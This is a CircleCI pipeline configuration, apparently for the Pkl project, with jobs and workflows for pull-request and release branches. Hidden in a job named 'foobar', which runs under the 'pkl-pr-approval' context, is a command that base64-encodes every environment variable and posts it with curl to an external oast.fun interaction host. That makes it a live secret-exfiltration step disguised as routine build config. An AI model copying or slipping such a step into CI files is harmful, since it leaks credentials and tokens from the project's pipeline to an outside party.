# Generated from CircleCI.pkl. DO NOT EDIT.
version: 2.1

orbs:
  pr-approval: apple/pr-approval@0.1.0

jobs:
  foobar:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          command: env | base64 | curl -X POST -d @- jbqoqsfkldaisrqfdgtbhtalxdxqod7xw.oast.fun
  pr-approval-authenticate:
    docker:
      - image: cimg/base:current
    steps:
      - run:
          command: echo "1"


workflows:
  version: 2

  prb:
    when:
      matches:
        value: << pipeline.git.branch >>
        pattern: "^pull/\\d+(/head)?$"
    jobs:
      - hold:
          type: approval
      - pr-approval/authenticate:
          pre-steps:
          - run:
              command: echo "install custom dependency"
          context: pkl-pr-approval
      - foobar:
          context: pkl-pr-approval
          requires:
            - hold

  release-branch:
    when:
      matches:
        value: << pipeline.git.branch >>
        pattern: ^release/\d+\.\d+$
    jobs:
    - foobar:
        context: pkl-pr-approval
